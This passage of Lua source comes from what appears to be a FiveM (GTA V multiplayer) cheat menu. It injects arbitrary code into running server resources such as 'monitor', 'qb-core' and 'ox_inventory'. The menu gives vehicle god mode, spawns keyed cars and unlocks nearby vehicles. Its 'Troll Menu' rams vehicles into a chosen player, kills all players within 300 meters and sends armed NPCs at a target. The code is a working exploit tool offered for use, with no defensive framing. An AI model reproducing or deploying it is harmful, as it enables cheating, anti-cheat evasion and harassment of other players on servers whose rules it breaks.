                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            end
            MachoMenuNotification("~g~Teleported to nearest vehicle!", 2500)
        end
    end
end)

-- RainCar Spawn
MachoMenuText(VehicleSection, "RainCar Spawn")
local VehicleModelInputBoxHandle = MachoMenuInputbox(VehicleSection, "Vehicle Model", "Enter vehicle name")

-- Start RainCar Button
MachoMenuButton(VehicleSection, "Start Vehicle Rain", function()
    local model = MachoMenuGetInputbox(VehicleModelInputBoxHandle)
    if model == nil or model == "" then
        MachoMenuNotification("Error", "Please enter a valid vehicle model!")
        return
    end

    MachoInjectResource("monitor", string.format([[
        if careverActive then
            print("Carever is already running.")
            return
        end

        local vehicleModel = "%s"
        careverActive = true

        Citizen.CreateThread(function()
            while careverActive do
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)
                
                RequestModel(GetHashKey(vehicleModel))
                while not HasModelLoaded(GetHashKey(vehicleModel)) do
                    Citizen.Wait(100)
                end
                
                local randomX = playerCoords.x + math.random(-50, 50)
                local randomY = playerCoords.y + math.random(-50, 50)
                local randomZ = playerCoords.z + 100
                
                local vehicle = CreateVehicle(GetHashKey(vehicleModel), randomX, randomY, randomZ, 0.0, true, true)
                SetEntityAsMissionEntity(vehicle, true, true)
                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleEngineOn(vehicle, true, true, true)
                
                Citizen.Wait(math.random(1000, 3000))
            end
        end)
    ]], model))

    MachoMenuNotification("RainCar", "Vehicle rain started!")
end)

-- Stop RainCar Button
MachoMenuButton(VehicleSection, "Stop Vehicle Rain", function()
    MachoInjectResource("monitor", [[
        careverActive = false
    ]])
    MachoMenuNotification("RainCar", "Vehicle rain stopped!")
end)

-- Helicopter Spawn Button
MachoMenuButton(VehicleSection, "Helicopter Spawn", function()
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    
    MachoInjectResource("monitor", [[
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local heliModel = "buzzard2"
        
        RequestModel(GetHashKey(heliModel))
        while not HasModelLoaded(GetHashKey(heliModel)) do
            Citizen.Wait(50)
        end
        
        local helicopter = CreateVehicle(GetHashKey(heliModel), playerCoords.x, playerCoords.y, playerCoords.z + 5.0, 0.0, true, true)
        SetEntityAsMissionEntity(helicopter, true, true)
        SetVehicleDoorsLocked(helicopter, 1)
        SetVehicleEngineOn(helicopter, true, true, true)
        
        SetModelAsNoLongerNeeded(GetHashKey(heliModel))
    ]])
    
    MachoMenuNotification("Helicopter", "Helicopter spawned!")
end)

-- Speedboost SHIFT CTRL Checkbox
local speedboostActive = false
MachoMenuCheckbox(VehicleSection, "Speedboost SHIFT CTRL", function()
    MachoInjectResource("monitor", [[
        speedboostActive = true
        CreateThread(function()
            while speedboostActive do
                if IsPedInAnyVehicle(PlayerPedId(), true) then
                    if IsControlPressed(0, 209) then -- LEFT SHIFT
                        SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 100.0)
                    elseif IsControlPressed(0, 210) then -- LEFT CTRL
                        SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
                    end
                end
                Wait(0)
            end
        end)
    ]])
end, function()
    MachoInjectResource("monitor", [[
        speedboostActive = false
    ]])
end)

-- Vehicle Godmode Checkbox
local VehGod = false
MachoMenuCheckbox(VehicleSection, "Vehicle God Mode", function()
    VehGod = true
    MachoInjectResource("monitor", [[
        VehGod = true
        CreateThread(function()
            while VehGod do
                local playerPed = PlayerPedId()
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsUsing(playerPed)
                    SetEntityInvincible(vehicle, true)
                end
                Wait(0)
            end
        end)
    ]])
end, function()
    VehGod = false
    MachoInjectResource("monitor", [[
        VehGod = false
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsUsing(playerPed)
            SetEntityInvincible(vehicle, false)
        end
    ]])
end)

-- Waterproof Vehicle Checkbox
local waterp = false
local waterpThread = nil
MachoMenuCheckbox(VehicleSection, "Waterproof Vehicle", function(enabled)
    waterp = enabled
    if waterp then
        if waterpThread == nil then
            waterpThread = Citizen.CreateThread(function()
                while waterp do
                    local playerPed = PlayerPedId()
                    if IsPedInAnyVehicle(playerPed, false) then
                        local vehicle = GetVehiclePedIsUsing(playerPed)
                        SetVehicleEngineOn(vehicle, true, true, true)
                        SetEntityProofs(vehicle, false, false, true, false, false, false, false, false)
                    end
                    Citizen.Wait(0)
                end
                waterpThread = nil
            end)
        end
    else
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsUsing(playerPed)
            SetEntityProofs(vehicle, false, false, false, false, false, false, false, false)
        end
        waterp = false
    end
end)

-- ============================================================
-- SPAWN CAR WITH KEYS (Added to VehicleSection)
-- ============================================================

-- Spawn Car with Keys
MachoMenuButton(VehicleSection, "Spawn Car with Keys", function()
    local targetResource = nil
    if GetResourceState('monitor') == "started" then
        targetResource = 'monitor'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, [[
        -- Spawn a random car with keys
        local carModels = {
            "sultan", "adder", "zentorno", "t20", "nero", 
            "fmj", "insurgent", "kuruma2", "elegy2", "banshee",
            "comet2", "jester", "massacro", "entityxf", "osiris",
            "reaper", "turismor", "pfister811", "italigtb", "vagner"
        }
        
        local modelName = carModels[math.random(1, #carModels)]
        local modelHash = GetHashKey(modelName)
        
        RequestModel(modelHash)
        local timeout = 0
        while not HasModelLoaded(modelHash) and timeout < 100 do
            Citizen.Wait(10)
            timeout = timeout + 1
        end
        
        if HasModelLoaded(modelHash) then
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            
            local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, heading, true, false)
            
            if DoesEntityExist(vehicle) then
                -- Set vehicle properties
                SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                SetVehicleEngineOn(vehicle, true, true, false)
                SetVehicleDoorsLocked(vehicle, 1)
                
                -- Give keys to player
                local plate = GetVehicleNumberPlateText(vehicle)
                TriggerEvent('vehiclekeys:client:SetOwner', plate)
                
                -- Put player in vehicle
                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                
                print("Vehicle spawned: " .. modelName .. " with keys")
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Spawned ' .. modelName .. ' with keys!' } })
            end
            
            SetModelAsNoLongerNeeded(modelHash)
        end
    ]])
    
    MachoMenuNotification("Vehicle", "Spawning random car with keys...")
end)

-- Spawn Specific Car with Keys (with input)
local VehicleSpawnInput = MachoMenuInputbox(VehicleSection, "Vehicle Model", "e.g., sultan")
MachoMenuButton(VehicleSection, "Spawn Specific Car with Keys", function()
    local modelName = MachoMenuGetInputbox(VehicleSpawnInput)
    
    if modelName and modelName ~= '' then
        local targetResource = nil
        if GetResourceState('monitor') == "started" then
            targetResource = 'monitor'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        else
            targetResource = 'ox_inventory'
        end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local modelName = "%s"
            local modelHash = GetHashKey(modelName)
            
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Citizen.Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local playerPed = PlayerPedId()
                local coords = GetEntityCoords(playerPed)
                local heading = GetEntityHeading(playerPed)
                
                local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, heading, true, false)
                
                if DoesEntityExist(vehicle) then
                    SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                    SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                    SetVehicleEngineOn(vehicle, true, true, false)
                    SetVehicleDoorsLocked(vehicle, 1)
                    
                    -- Give keys to player
                    local plate = GetVehicleNumberPlateText(vehicle)
                    TriggerEvent('vehiclekeys:client:SetOwner', plate)
                    
                    -- Put player in vehicle
                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                    
                    print("Vehicle spawned: " .. modelName .. " with keys")
                    TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Spawned ' .. modelName .. ' with keys!' } })
                end
                
                SetModelAsNoLongerNeeded(modelHash)
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'Invalid model: ' .. modelName } })
            end
        ]], modelName))
        
        MachoMenuNotification("Vehicle", "Spawning " .. modelName .. " with keys...")
    else
        MachoMenuNotification("Error", "Please enter a vehicle model!")
    end
end)

-- Simple version (if you already have a spawn function)
MachoMenuButton(VehicleSection, "Spawn Car with Keys (Simple)", function()
    local playerPed = PlayerPedId()
    local coords = GetEntityCoords(playerPed)
    local modelHash = GetHashKey("sultan")
    
    RequestModel(modelHash)
    while not HasModelLoaded(modelHash) do
        Citizen.Wait(0)
    end
    
    local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, GetEntityHeading(playerPed), true, false)
    
    if DoesEntityExist(vehicle) then
        SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
        SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
        SetVehicleEngineOn(vehicle, true, true, false)
        SetVehicleDoorsLocked(vehicle, 1)
        
        -- Give keys
        local plate = GetVehicleNumberPlateText(vehicle)
        TriggerEvent('vehiclekeys:client:SetOwner', plate)
        
        TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
        MachoMenuNotification("Vehicle", "Spawned Sultan with keys!")
    end
    
    SetModelAsNoLongerNeeded(modelHash)
end)

-- ============================================================
-- VEHICLE FEATURES (Add to VehicleSection or New Tab)
-- ============================================================

-- Set License Plate
local PlateInput = MachoMenuInputbox(VehicleSection, "License Plate", "e.g., 34AKP952")
MachoMenuButton(VehicleSection, "Set License Plate", function()
    local plate = MachoMenuGetInputbox(PlateInput)
    if plate and plate ~= '' then
        MachoInjectResource2(NewThreadNs, 'monitor', string.format([[
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsIn(ped, false)
            if veh and veh ~= 0 then
                SetVehicleNumberPlateText(veh, "%s")
                print("License plate set to: " .. "%s")
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'License plate set to: %s' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
            end
        ]], plate, plate, plate))
        MachoMenuNotification("Vehicle", "License plate set to: " .. plate)
    else
        MachoMenuNotification("Error", "Please enter a plate number!")
    end
end)

-- Repair Vehicle
MachoMenuButton(VehicleSection, "Repair Vehicle", function()
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        local ped = PlayerPedId()
        local vehicle = GetVehiclePedIsIn(ped, false)
        
        if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
            SetVehicleFixed(vehicle)
            SetVehicleDeformationFixed(vehicle)
            SetVehicleUndriveable(vehicle, false)
            SetVehicleEngineOn(vehicle, true, true, true)
            SetVehicleEngineHealth(vehicle, 1000.0)
            SetVehicleBodyHealth(vehicle, 1000.0)
            SetVehiclePetrolTankHealth(vehicle, 1000.0)
            SetVehicleFuelLevel(vehicle, 100.0)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle repaired!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]])
    MachoMenuNotification("Vehicle", "Vehicle repaired!")
end)

-- Clean Vehicle
MachoMenuButton(VehicleSection, "Clean Vehicle", function()
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 then
            SetVehicleDirtLevel(veh, 0.0)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle cleaned!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]])
    MachoMenuNotification("Vehicle", "Vehicle cleaned!")
end)

-- Force Engine
MachoMenuButton(VehicleSection, "Force Engine", function()
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 then
            SetVehicleEngineOn(veh, true, true, true)
            SetVehicleUndriveable(veh, false)
            SetVehicleNeedsToBeHotwired(veh, false)
            SetVehicleKeepEngineOnWhenAbandoned(veh, true)
            SetVehicleEngineCanDegrade(veh, false)
            SetVehicleEngineHealth(veh, 900.0)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Engine forced on!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]])
    MachoMenuNotification("Vehicle", "Engine forced on!")
end)

-- Max Upgrade
MachoMenuButton(VehicleSection, "Max Upgrade", function()
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleModKit(veh, 0)
            SetVehicleWheelType(veh, 7)
            
            -- All mods
            for modType = 0, 16 do
                local maxMod = GetNumVehicleMods(veh, modType)
                if maxMod and maxMod > 0 then
                    SetVehicleMod(veh, modType, maxMod - 1, false)
                end
            end
            
            -- Turbo
            SetVehicleMod(veh, 14, 16, false)
            
            -- Spoiler
            local spoilerMax = GetNumVehicleMods(veh, 15)
            if spoilerMax and spoilerMax > 1 then
                SetVehicleMod(veh, 15, spoilerMax - 2, false)
            end
            
            -- Toggle mods
            for modType = 17, 22 do
                ToggleVehicleMod(veh, modType, true)
            end
            
            -- Window tint
            SetVehicleWindowTint(veh, 1)
            
            -- Tyres
            SetVehicleTyresCanBurst(veh, false)
            
            -- Remove extras
            for extra = 1, 12 do
                if DoesExtraExist(veh, extra) then
                    SetVehicleExtra(veh, extra, false)
                end
            end
            
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle max upgraded!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]])
    MachoMenuNotification("Vehicle", "Vehicle max upgraded!")
end)

-- Delete Vehicle
MachoMenuButton(VehicleSection, "Delete Vehicle", function()
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleHasBeenOwnedByPlayer(veh, true)
            SetEntityAsMissionEntity(veh, true, true)
            
            if NetworkHasControlOfEntity(veh) then
                DeleteEntity(veh)
                DeleteVehicle(veh)
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle deleted!' } })
            else
                NetworkRequestControlOfEntity(veh)
                Wait(100)
                DeleteEntity(veh)
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle deleted!' } })
            end
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]])
    MachoMenuNotification("Vehicle", "Deleting vehicle...")
end)

-- Unlock Closest Vehicle
MachoMenuButton(VehicleSection, "Unlock Closest Vehicle", function()
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) and NetworkHasControlOfEntity(veh) then
            SetEntityAsMissionEntity(veh, true, true)
            SetVehicleHasBeenOwnedByPlayer(veh, true)
            SetVehicleDoorsLocked(veh, 1)
            SetVehicleDoorsLockedForAllPlayers(veh, false)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Closest vehicle unlocked!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'No vehicle found nearby!' } })
        end
    ]])
    MachoMenuNotification("Vehicle", "Unlocking closest vehicle...")
end)

-- Teleport into Closest Vehicle
MachoMenuButton(VehicleSection, "TP into Closest Vehicle", function()
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 15.0, 0, 70)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) and not IsPedInAnyVehicle(ped, false) then
            if GetPedInVehicleSeat(veh, -1) == 0 then
                TaskWarpPedIntoVehicle(ped, veh, -1)
            else
                TaskWarpPedIntoVehicle(ped, veh, 0)
            end
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Teleported into closest vehicle!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'No vehicle found nearby or you are already in a vehicle!' } })
        end
    ]])
    MachoMenuNotification("Vehicle", "Teleporting into closest vehicle...")
end)

-- ============================================================
-- VEHICLE TOGGLES (Checkboxes)
-- ============================================================

-- Boost Vehicle
local boostActive = false
MachoMenuCheckbox(VehicleSection, "Boost Vehicle", function()
    boostActive = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        if not _G.boostThreadRunning then
            _G.boostThreadRunning = true
            _G.boostEnabled = true
            
            CreateThread(function()
                while _G.boostThreadRunning do
                    Wait(0)
                    if not _G.boostEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    if IsControlPressed(0, 209) and IsPedInAnyVehicle(ped, false) then -- Shift
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 then
                            SetVehicleForwardSpeed(veh, 100.0)
                        end
                    end
                    ::continue::
                end
            end)
        end
        _G.boostEnabled = true
    ]])
    MachoMenuNotification("Boost", "Boost Vehicle ON (Hold Shift)")
end, function()
    boostActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        _G.boostEnabled = false
        _G.boostThreadRunning = false
    ]])
    MachoMenuNotification("Boost", "Boost Vehicle OFF")
end)

-- Instant Brakes
local instantBrakesActive = false
MachoMenuCheckbox(VehicleSection, "Instant Brakes", function()
    instantBrakesActive = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        if not _G.brakesThreadRunning then
            _G.brakesThreadRunning = true
            _G.brakesEnabled = true
            
            CreateThread(function()
                while _G.brakesThreadRunning do
                    Wait(0)
                    if not _G.brakesEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    local veh = GetVehiclePedIsIn(ped, false)
                    if veh and veh ~= 0 and IsDisabledControlPressed(0, 33) and IsPedInAnyVehicle(ped, false) then -- S
                        SetVehicleForwardSpeed(veh, 0.0)
                    end
                    ::continue::
                end
            end)
        end
        _G.brakesEnabled = true
    ]])
    MachoMenuNotification("Brakes", "Instant Brakes ON (Hold S)")
end, function()
    instantBrakesActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        _G.brakesEnabled = false
        _G.brakesThreadRunning = false
    ]])
    MachoMenuNotification("Brakes", "Instant Brakes OFF")
end)

-- Easy Handling
local easyHandlingActive = false
MachoMenuCheckbox(VehicleSection, "Easy Handling", function()
    easyHandlingActive = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        if not _G.handlingThreadRunning then
            _G.handlingThreadRunning = true
            _G.handlingEnabled = true
            
            CreateThread(function()
                while _G.handlingThreadRunning do
                    Wait(0)
                    if not _G.handlingEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    local veh = GetVehiclePedIsIn(ped, false)
                    if veh and veh ~= 0 and DoesEntityExist(veh) then
                        SetVehicleGravityAmount(veh, 73.0)
                        SetVehicleStrong(veh, true)
                    end
                    ::continue::
                end
            end)
        end
        _G.handlingEnabled = true
    ]])
    MachoMenuNotification("Handling", "Easy Handling ON")
end, function()
    easyHandlingActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        _G.handlingEnabled = false
        _G.handlingThreadRunning = false
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleGravityAmount(veh, 9.8)
            SetVehicleStrong(veh, false)
        end
    ]])
    MachoMenuNotification("Handling", "Easy Handling OFF")
end)

-- Rainbow Vehicle
local rainbowActive = false
MachoMenuCheckbox(VehicleSection, "Rainbow Vehicle", function()
    rainbowActive = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        if not _G.rainbowThreadRunning then
            _G.rainbowThreadRunning = true
            _G.rainbowEnabled = true
            
            CreateThread(function()
                local freq = 1.0
                while _G.rainbowThreadRunning do
                    Wait(0)
                    if not _G.rainbowEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    local veh = GetVehiclePedIsIn(ped, false)
                    if veh and veh ~= 0 and DoesEntityExist(veh) then
                        local t = GetGameTimer() / 1000
                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                        SetVehicleCustomPrimaryColour(veh, r, g, b)
                        SetVehicleCustomSecondaryColour(veh, r, g, b)
                    end
                    ::continue::
                end
            end)
        end
        _G.rainbowEnabled = true
    ]])
    MachoMenuNotification("Rainbow", "Rainbow Vehicle ON")
end, function()
    rainbowActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        _G.rainbowEnabled = false
        _G.rainbowThreadRunning = false
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
            SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
        end
    ]])
    MachoMenuNotification("Rainbow", "Rainbow Vehicle OFF")
end)

-- Unlimited Fuel
local unlimitedFuelActive = false
MachoMenuCheckbox(VehicleSection, "Unlimited Fuel", function()
    unlimitedFuelActive = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        if not _G.fuelThreadRunning then
            _G.fuelThreadRunning = true
            _G.fuelEnabled = true
            
            CreateThread(function()
                while _G.fuelThreadRunning do
                    Wait(100)
                    if not _G.fuelEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                            SetVehicleFuelLevel(veh, 100.0)
                        end
                    end
                    ::continue::
                end
            end)
        end
        _G.fuelEnabled = true
    ]])
    MachoMenuNotification("Fuel", "Unlimited Fuel ON")
end, function()
    unlimitedFuelActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        _G.fuelEnabled = false
        _G.fuelThreadRunning = false
    ]])
    MachoMenuNotification("Fuel", "Unlimited Fuel OFF")
end)

-- Tab: Troll Menu
local TrollTab = MachoMenuAddTab(MenuWindow, "Troll Menu")

-- Group 1: Vehicle and NPC Features
local VehicleNPCSection = MachoMenuGroup(
    TrollTab,
    "Vehicle and NPC Features",
    420,              -- X position (fixed)
    9,               -- Y position
    710,             -- Width (increased)
    MenuSize.y - 10
)

-- Group 2: Player Manipulation
local PlayerManipSection = MachoMenuGroup(
    TrollTab,
    "Player Manipulation",
    155,             -- X position (FirstSection + width + space)
    9,               -- Y position
    420,             -- Width (same structure)
    MenuSize.y - 10
)

-- Title: Vehicle Ram
MachoMenuText(VehicleNPCSection, "Vehicle Ram")

-- Player ID text input (Vehicle Ram)
local PlayerIdInputBoxHandle = MachoMenuInputbox(VehicleNPCSection, "Target Player ID (Vehicle Ram)", "e.g., 123")

-- Ram Player button
MachoMenuButton(VehicleNPCSection, "Launch Vehicle at Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    if targetId and targetId > 0 then
        MachoInjectResource('monitor', string.format([[
            local playerId = GetPlayerFromServerId(%d)
            if playerId then
                local targetPed = GetPlayerPed(playerId)
                local targetCoords = GetEntityCoords(targetPed)
                local offset = GetOffsetFromEntityInWorldCoords(targetPed, 0, -2.0, 0)
                local vehModel = "sultan"
                RequestModel(vehModel)
                while not HasModelLoaded(vehModel) do
                    Citizen.Wait(0)
                end
                local vehicle = CreateVehicle(vehModel, offset.x, offset.y, offset.z, GetEntityHeading(targetPed), true, true)
                SetEntityVisible(vehicle, true, true)
                if DoesEntityExist(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    SetVehicleDoorsLocked(vehicle, 4)
                    SetVehicleForwardSpeed(vehicle, 80.0)
                end
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle launched! Target ID: %d' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Player not found! ID: %d' } })
            end
        ]], targetId, targetId, targetId))
        MachoMenuNotification("Vehicle System", "Vehicle launch initiated! Target ID: " .. targetId)
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- ============================================================
-- KILL EVERYONE NEARBY (300 meters)
-- ============================================================

MachoMenuButton(PlayerManipSection, "Kill Everyone Nearby (300m)", function()
    MachoMenuNotification("Kill All", "Killing all players within 300 meters...")
    
    local targetResource = nil
    if GetResourceState('vrp') == "started" then
        targetResource = 'vrp'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    elseif GetResourceState('es_extended') == "started" then
        targetResource = 'es_extended'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, [[
        local myPed = PlayerPedId()
        local myCoords = GetEntityCoords(myPed)
        local weaponHash = GetHashKey("WEAPON_PISTOL50")
        local killed = 0
        local players = {}
        
        -- Get all nearby players within 300 meters
        for _, player in ipairs(GetActivePlayers()) do
            if player ~= PlayerId() then
                local targetPed = GetPlayerPed(player)
                if targetPed and DoesEntityExist(targetPed) and not IsEntityDead(targetPed) then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(myCoords - targetCoords)
                    if distance <= 300.0 then
                        table.insert(players, {ped = targetPed, coords = targetCoords, name = GetPlayerName(player), dist = math.floor(distance)})
                    end
                end
            end
        end
        
        if #players == 0 then
            print("Kill All: No players within 300 meters!")
            MachoMenuNotification("Kill All", "No players nearby!")
            return
        end
        
        print("Kill All: Found " .. #players .. " players within 300 meters")
        
        -- Kill each player
        for _, p in ipairs(players) do
            local targetPed = p.ped
            local headPos = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
            local myPos = GetEntityCoords(myPed)
            
            -- Method 1: Direct damage
            ApplyDamageToPed(targetPed, 200, true, weaponHash)
            SetEntityHealth(targetPed, 0)
            
            -- Method 2: Silent bullet for safety
            ShootSingleBulletBetweenCoords(
                myPos.x, myPos.y, myPos.z + 0.5,
                headPos.x, headPos.y, headPos.z,
                250, true, weaponHash, myPed, true, false, 1000.0
            )
            
            killed = killed + 1
            print("Kill All: Killed " .. p.name .. " (" .. p.dist .. "m)")
        end
        
        MachoMenuNotification("Kill All", "Killed " .. killed .. " players within 300m")
        print("Kill All: Killed " .. killed .. " players")
    ]])
end)

-- Title: NPC Spawn
MachoMenuText(VehicleNPCSection, "NPC Attack")

-- Player ID text input (NPC Spawn)
local NpcTargetIdInputBoxHandle = MachoMenuInputbox(VehicleNPCSection, "Target Player ID (NPC)", "e.g., 123")

-- NPC Spawn button
MachoMenuButton(VehicleNPCSection, "Start NPCs", function()
    local targetId = tonumber(MachoMenuGetInputbox(NpcTargetIdInputBoxHandle))
    if targetId and targetId > 0 then
        if isSpawning then
            MachoMenuNotification("Error", "NPCs are already spawning! Stop them first.")
            return
        end
        isSpawning = true
        MachoMenuNotification("NPC System", "NPC spawn initiated! Target ID: " .. targetId)
        Citizen.CreateThread(function()
            while isSpawning do
                MachoInjectResource('monitor', string.format([[
                    local npcModel = "a_m_m_acult_01"
                    local weaponHash = "weapon_rayminigun"
                    local radius = 5.0
                    local numberOfPeds = 5
                    local playerPed = GetPlayerPed(GetPlayerFromServerId(%d))
                    if not DoesEntityExist(playerPed) then
                        TriggerEvent('chat:addMessage', { args = { '^1NPC System:', 'Target player not found!' } })
                        return
                    end
                    local playerPos = GetEntityCoords(playerPed)
                    RequestModel(npcModel)
                    while not HasModelLoaded(npcModel) do
                        Citizen.Wait(100)
                    end
                    for i = 0, numberOfPeds - 1 do
                        local angle = (i / numberOfPeds) * (2 * math.pi)
                        local spawnX = playerPos.x + radius * math.cos(angle)
                        local spawnY = playerPos.y + radius * math.sin(angle)
                        local spawnZ = playerPos.z
                        local npc = CreatePed(4, npcModel, spawnX, spawnY, spawnZ, 0.0, true, false)
                        GiveWeaponToPed(npc, GetHashKey(weaponHash), 250, false, true)
                        SetPedCombatAttributes(npc, 5, true)
                        SetPedCombatRange(npc, 2)
                        SetPedCombatMovement(npc, 3)
                        TaskCombatPed(npc, playerPed, 0, 16)
                        SetEntityAsNoLongerNeeded(npc)
                    end
                ]], targetId, targetId))
                Wait(2000) -- Spawn ped every 2 seconds
            end
        end)
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- Stop NPC Spawn button
MachoMenuButton(VehicleNPCSection, "Stop NPCs", function()
    if isSpawning then
